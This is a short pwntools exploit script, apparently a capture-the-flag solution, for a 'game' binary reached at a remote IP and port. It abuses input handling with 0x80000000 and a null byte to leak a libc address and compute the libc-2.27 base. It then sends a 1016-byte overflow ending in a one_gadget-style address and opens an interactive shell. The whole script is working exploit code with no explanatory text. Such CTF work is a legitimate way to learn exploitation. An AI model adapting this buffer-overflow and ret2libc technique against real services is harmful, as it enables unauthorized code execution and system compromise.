from pwn import *

local = False

elf = 'game' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "140.114.77.172"
    port = 10111
    r = remote(ip,port)

context.arch = 'amd64'
l = ELF('./libc-2.27.so')
raw_input("aaa")
print r.recvuntil('et :')
r.send('\x00')
print r.recvuntil(' :')
r.sendline(str(0x80000000))
print r.recvuntil(' : ')
# print "aaaaaa"
# print r.recv(14)
# print "aaaaaa"
l.address = int( r.recv(14) , 16 ) - 0x64e80
success( 'libc_bass -> %s ' , hex( l.address ))
r.sendline('aaa')
print r.recvuntil('e :')
r.sendline(str(0x80000000))
# pop_rdi = 
print r.recvuntil('e :')
rop = flat(
    'a' * 1016,
    l.address + 0x10a38c
)
r.sendline( rop  )

r.interactive()